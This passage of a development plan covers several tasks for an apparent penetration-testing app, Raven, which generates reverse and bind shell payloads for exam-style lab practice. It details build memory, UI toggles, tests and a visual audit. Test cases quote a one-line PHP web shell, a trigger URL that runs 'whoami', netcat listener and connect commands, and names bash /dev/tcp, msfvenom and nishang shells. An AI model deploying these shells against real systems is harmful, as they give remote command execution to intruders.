- [ ] **Step 3:** Implement. Remove `REQUIRE_TOOL`'s fold path; update the precedence doc comment.
- [ ] **Step 4:** Run → PASS; `npm test` (update `drawer.test.tsx`/`workbench.test.tsx` only where they asserted a tool-missing or failed payload in "Don't fit here": it is now a marked fit).
- [ ] **Step 5:** Commit: `feat(payloads): toggles mark instead of fold; callback clue; filter wrappers`.

---

### Task 6: Build memory — migration 0013, Rust commands, API, stale check

**Files:**
- Create: `src-tauri/migrations/0013_payload_builds.sql`, `src-tauri/src/payload_builds.rs`
- Modify: `src-tauri/src/migrations/mod.rs`, `src-tauri/src/lib.rs` (module + invoke handler), `src-tauri/src/commands.rs`
- Modify: `src/lib/api.ts`, `src/audit/fakeApi.ts`; create `src/types/payloadBuild.ts`, `src/features/payloads/queries.ts`
- Modify: `src/engines/payloads/memory.ts` (replace `staleBaked` with `staleBuild`; delete `staleBaked` and its tests)
- Test: Rust unit tests in `payload_builds.rs`, migration test in `migrations/mod.rs` tests, `src/test/engines/payloads/memory.test.ts`

**Interfaces:**
- SQL:
  ```sql
  -- Which baked payload (served script, msfvenom file, uploaded shell) was last built for a host, and with what LHOST/LPORT.
  -- No payload text. One row per host and payload: a rebuild replaces it.
  CREATE TABLE payload_builds (
    engagement_id TEXT NOT NULL REFERENCES engagements(id) ON DELETE CASCADE,
    host_id TEXT NOT NULL REFERENCES hosts(id) ON DELETE CASCADE,
    payload_id TEXT NOT NULL, lhost TEXT NOT NULL, lport TEXT NOT NULL, at INTEGER NOT NULL,
    PRIMARY KEY (host_id, payload_id));
  CREATE INDEX payload_builds_engagement ON payload_builds (engagement_id);
  ```
- Rust: `PayloadBuild { engagement_id, host_id, payload_id, lhost, lport, at }` (serde camelCase like siblings); `list(conn, engagement_id) -> AppResult<Vec<PayloadBuild>>`; `record(conn, input: PayloadBuild) -> AppResult<PayloadBuild>` (upsert on the primary key; rejects a host not in the engagement with the same error style as `host_facts.rs` `host_engagement`). Commands `payload_builds_list(engagement_id)`, `payload_build_record(input)`.
- TS: `api.payloadBuildsList(engagementId): Promise<PayloadBuild[]>`, `api.payloadBuildRecord(input: PayloadBuild): Promise<PayloadBuild>`; fakeApi equivalents on an in-memory `db.payloadBuilds`; query key `payloadBuildsKey = (eid: string) => ["payloadBuilds", eid] as const` exported from a new `src/features/payloads/queries.ts`.
- `memory.ts`: `staleBuild(records: PayloadBuild[], hostId: string | null, payloadId: string, current: { LHOST: string; LPORT: string }): { was: string; now: string } | null` — null when no host, no record, either current value blank, either recorded value blank, or both equal; else `{ was: "192.0.2.10:443", now: "192.0.2.20:443" }`.

- [ ] **Step 1: Failing tests.**
  - Rust: `record_upserts_one_row_per_host_and_payload`, `record_rejects_host_of_other_engagement`, `deleting_host_cascades`; migration test: an existing v12 database migrates to 13 with the backup hook called once and `payload_builds` present (follow the existing migration tests' pattern).
  - `memory.test.ts`: `staleBuild` — no host → null; no record → null; same values → null; LHOST changed → `{was:"192.0.2.10:443", now:"192.0.2.20:443"}`; current LPORT blank → null; recorded LHOST blank → null; another host's record ignored.
- [ ] **Step 2:** `cd src-tauri && cargo test payload_builds migrations` and `npx vitest run src/test/engines/payloads/memory.test.ts` → FAIL.
- [ ] **Step 3:** Implement.
- [ ] **Step 4:** Same → PASS; `npm test`, `npm run typecheck`, `cargo test`.
- [ ] **Step 5:** Commit: `feat(payloads): remember baked payload builds (migration 0013)`.

---

### Task 7: Toggles and listener choice in the drawer and Workbench

**Files:**
- Modify: `src/features/payloads/usePayloadsStore.ts`, `usePayloadFit.ts`, `usePayloadSession.tsx`, `ContextChips.tsx`, `PayloadsWorkbench.tsx`, `PayloadView.tsx`
- Create: `src/features/payloads/ToolsPicker.tsx`
- Test: `src/test/features/payloads/drawer.test.tsx`, `src/test/features/payloads/workbench.test.tsx`, `src/test/features/payloads/toggles.test.tsx` (new)

**Interfaces:**
- Consumes: Tasks 1–5 (`rankPayloads` with `Toggles`, `marks`, `callbackClue`, `filterChoices`, `FILTER_CONTEXTS`, `buildPayload` opts, `SHELLS`).
- Store: `PayloadOverride` gains `callbacksBlocked?: boolean; filter?: FilterId; tools?: Partial<Record<ToolId, "present" | "missing">>`; state gains `listenerPick: Record<string, ListenerId>` (by payload id, session) and `pickListener(payloadId, id)`.
- `usePayloadFit` returns `toggles`, `callbackClue`, `marks` per ranked generator (`Ranked` gains `marks: Record<string, string[]>`), and `build(def, extra)` passes `os` (the chosen OS, for any-OS defs), `listener: listenerPick[def.id]`, `filter` (when applicable) and `TARGET_IP: host?.ip ?? ""`. The `shell` generator ranks `SHELLS`.
- Drawer (`ContextChips`): a second chip row under OS / Paste into / Port: `Callbacks: allowed|blocked` (⌥B, ChipPicker with two options), `Filter: off|…` (⌥F, shown only when the context is in `FILTER_CONTEXTS`; options from `filterChoices(os)`), `Tools: <n> set` / `Tools: not set` (⌥T, opens `ToolsPicker`). When `callbackClue` is non-null and callbacks are allowed, the Callbacks chip text is amber and the "why" line shows the clue; the chip never changes value by itself.
- `ToolsPicker`: a popover (use the existing shadcn popover in `src/ui/shadcn` if present; else the pattern `ChipPicker` uses) with one row per `ToolId`: label + three-way choice `unknown / on box / missing`; rows pre-filled from inference show "from your log" in muted text. ↑↓ move, ←→ or Space cycle, Esc closes and returns focus to the chip.
- Workbench: "Raven's read" gains `Callbacks`, `Filter` (only in filter contexts) and `Tools` ReadItems using `Toggle` buttons (Tools uses the same `ToolsPicker` trigger). Replace the "Exam rules" text with: exam-sim → `Meterpreter: one machine only. ${locked ? "Locked to <host>." : "Not locked yet."}`; otherwise `No exam limits.`.
- Fit list (`PayloadView` `FitRow`): a marked fit shows its marks in amber in the reason column, before the `requires` reasons; a mark-free list is unchanged. Rows of bind shells show "bind" as their first reason; webshells show "web shell".
- Listener choice (`PayloadBlock`): when `built.def.listeners.length > 1`, a small ChipPicker beside the Listener / Connect-from-Kali heading (`Listener: penelope ▾`), Tab-reachable; picking calls `pickListener`. The heading uses `built.listenerHeading`.
- Keys in `usePayloadSession`: `KeyB`, `KeyF`, `KeyT` open the three chips/groups (`KeyF` only when shown). `hintsFor` adds, for the shell generator, `{ keys: "⌥B", label: "callbacks", priority: 4 }`, `{ keys: "⌥F", label: "filter", priority: 4 }` (only when the filter applies — pass a flag), `{ keys: "⌥T", label: "tools", priority: 4 }`. `GENERATORS[0].label` → `"Shell"`. `listKey` includes the toggles so the selected index resets when they change.

- [ ] **Step 1: Failing tests** (`toggles.test.tsx`, using the existing drawer test harness and fake data):
  - `⌥B blocks callbacks`: Linux host, Bash prompt → first fit row is "Bind: mkfifo + nc" (whatever title Task 3 used); "Bash /dev/tcp" row shows "Needs a callback" and is still in the fit list (not under "Don't fit here").
  - `clue turns the chip amber but does not flip it`: two failed reverse-shell log entries on the host → Callbacks chip has the warn class and the why-line says "Callbacks failed here twice"; chip still reads "allowed"; first fit is still a reverse shell.
  - `⌥F offers wrappers only in injection contexts`: context Injected command → chip present, pick base64 → the payload text equals Task 5's exact filtered `bash-tcp` output for that context; switch context to Bash prompt → chip gone, payload is the plain one.
  - `⌥T marks a missing tool`: tick python3 missing → "Python 3 with PTY" row shows "Needs python3" and sits after every unmarked row.
  - `listener pick sticks per payload`: on `socat-tty` pick `rlwrap nc` → listener block shows `rlwrap nc -lvnp 443`; select `bash-tcp` → its listener is `penelope -O -p 443`.
  - `bind shell connects from Kali`: select a bind fit → heading "Connect from Kali", text `rlwrap nc -nv 198.51.100.20 4444` (fixture host IP 198.51.100.20).
  - Workbench: the three ReadItems render and ⌥B/⌥T reach them; "Exam rules" copy in exam-sim reads "Meterpreter: one machine only. Not locked yet."
  - Hint line lists ⌥B and ⌥T for the shell generator, not for Transfer.
- [ ] **Step 2:** `npx vitest run src/test/features/payloads` → FAIL.
- [ ] **Step 3:** Implement.
- [ ] **Step 4:** `npx vitest run src/test/features/payloads && npm test && npm run typecheck && npm run lint` → PASS.
- [ ] **Step 5:** Commit: `feat(payloads): Callbacks, Filter and Tools toggles; pick the listener`.

---

### Task 8: Uploaded file view, Metasploit lock line, stale-build block

**Files:**
- Modify: `src/features/payloads/PayloadView.tsx`, `usePayloadSession.tsx`, `usePayloadFit.ts`
- Test: `src/test/features/payloads/buildBlock.test.tsx` (new), `src/test/features/payloads/upload.test.tsx` (new)

**Interfaces:**
- Consumes: Task 4 `msfLockLine`, Task 6 `staleBuild`, `api.payloadBuildRecord`, `payloadBuildsKey`, Task 0 `attempt(..., { warn, warnKey })`, Task 1 `built.trigger`.
- `usePayloadFit` loads `payloadBuilds` with `useQuery({ queryKey: payloadBuildsKey(eid), queryFn: () => api.payloadBuildsList(eid) })` and exposes `staleFor(def): { was; now } | null` (only for `def.bakesIp`) and `lockLine(def): string | null`. Remove `staleLines`.
- **Build step vs trigger** (for a `bakesIp` def): if `def.prepare` exists, the build step is the prepare block and the trigger is the payload; otherwise (msfvenom, uploaded `kali` files) the payload is the build step and the trigger is `built.trigger` (uploaded) or nothing (msfvenom).
- Recording: after a successful copy (↵, Copy button or ⌘↵) of a build step → `payloadBuildRecord({ engagementId, hostId, payloadId, lhost, lport, at: Date.now() })` and invalidate `payloadBuildsKey`. A trigger copy records only when `staleFor(def)` is null. No host → no call. A record failure shows in `status` (as log failures do) but never undoes the copy.
- Prepare blocks go through the copy guard too (their own `copyKey` id `${def.id}:prepare`), so the unresolved check and recording apply.
- Stale view: when `staleFor(def)` is non-null, the build step moves to the top with the amber line `Rebuild first: built with ${was}, now ${now}` above it; the trigger keeps its place but copies through `attempt(..., { warn: "Built with " + was + "; rebuild first", warnKey: was })`. Once the build step is copied (record written, query refetched) the line and the guard disappear.
- Lock: when `lockLine(def)` is non-null, an amber line above the payload block, and the payload copy goes through `attempt(..., { warn: lockLine, warnKey: "msf-lock" })`.
- Uploaded file view (def with `upload`): headings `Save as {FILE}` (content shells) or `Make {FILE} on Kali` (`upload.kali`), then `Trigger it`, a CommandBlock with `built.trigger.text` (placeholders highlighted, plain copy). In the Workbench (`numbered`) these are steps like the others. UPLOAD_PATH and TARGET_IP appear as fill fields (Task 7 fields already list template placeholders — extend `fieldTokens` to read `def.upload?.trigger` too).

- [ ] **Step 1: Failing tests.**
  - `upload.test.tsx`: pick Uploaded file on a Linux host → fits include "PHP ?cmd= web shell"; the view shows "Save as shell.php", the content `<?php system($_REQUEST['cmd']); ?>`, "Trigger it" and `http://198.51.100.20/{UPLOAD_PATH}/shell.php?cmd=whoami`; typing `/uploads/` in UPLOAD_PATH → `http://198.51.100.20/uploads/shell.php?cmd=whoami`.
  - `buildBlock.test.tsx`:
    - `copying a build records it`: msfvenom Windows x64 exe, ↵ → `payloadBuildRecord` called with `{payloadId: "msf-win-x64-exe", lhost: "192.0.2.10", lport: "443", hostId}`; same via the Copy button; same via ⌘↵.
    - `a changed LHOST blocks the trigger`: seed a nishang record with LHOST 192.0.2.10, set LHOST 192.0.2.20 → the amber line "Rebuild first: built with 192.0.2.10:443, now 192.0.2.20:443" is shown, the prepare block is first; ↵ on the cradle shows the warn hint and copies nothing; copying the prepare block records `192.0.2.20` and removes the line; ↵ on the cradle then copies at once.
    - `forcing past the block does not clear it`: second ↵ on the cradle copies but `payloadBuildRecord` is not called and the line stays.
    - `no host, no block`: same seed, host chip cleared → no line, no record call.
    - `Meterpreter lock`: exam-sim engagement with `msfHostId` of another host → "Metasploit is locked to <name>" line; first ↵ guarded with that hint, second copies; `msf-win-x64-shell-staged` shows no line; outside exam-sim no line.
- [ ] **Step 2:** `npx vitest run src/test/features/payloads` → FAIL.
- [ ] **Step 3:** Implement.
- [ ] **Step 4:** `npm test && npm run typecheck && npm run lint` → PASS.
- [ ] **Step 5:** Commit: `feat(payloads): uploaded-file view, Meterpreter lock line, rebuild-first block`.

---

### Task 9: Visual audit, follow-ups doc, field check

**Files:**
- Modify: `audit/screens.ts` (and `audit/fixtures/` / `src/audit/fixtures.ts` for a host with an IP, an exam-sim engagement with `msfHostId` set to another host, a stale nishang build, and two failed reverse shells), `audit/visual.spec.ts` / `audit/keyboard.spec.ts` as their patterns require
- Modify: `docs/superpowers/followups/2026-11-07-raven-2b-payloads.md`
- Modify: `src/engines/payloads/reverseShells.ts` (prepare-step part notes naming the Kali package)

**Interfaces:** none new.

- [ ] **Step 1:** Add audit screens at 900, 1100, 1280 and 1440 for: drawer with the second chip row (clue amber), drawer Tools popover open, Workbench Raven's read with the three toggles, Uploaded file view (drawer and Workbench), the stale "Rebuild first" view, the Meterpreter lock line. Keyboard audit: ⌥B, ⌥F, ⌥T open their controls and Esc returns focus.
- [ ] **Step 2:** `npm run audit:visual` → read the report; fix any overflow, truncation without `title`, contrast or focus findings in the touched components (CSS grid, theme tokens).
- [ ] **Step 3:** In the powercat and nishang prepare parts, add the package: "From Kali's `powercat` package" / "From Kali's `nishang` package; check the path with `dpkg -L nishang | grep Invoke-PowerShellTcp` if cp fails." Update the parts tests.
- [ ] **Step 4:** Follow-ups doc: tick the Transfer hint, the IPs, the stale-LHOST owner decision and the exam-ban owner decision; note the Kali-path check stays open for the owner's next lab; add new follow-ups found during this build (e.g. the WAR duplicate can now use `os: "any"`).
- [ ] **Step 5:** `npm test && npm run typecheck && npm run lint && (cd src-tauri && cargo test)` → PASS. Commit: `chore(payloads): audit coverage for 2b-C, follow-ups updated`.
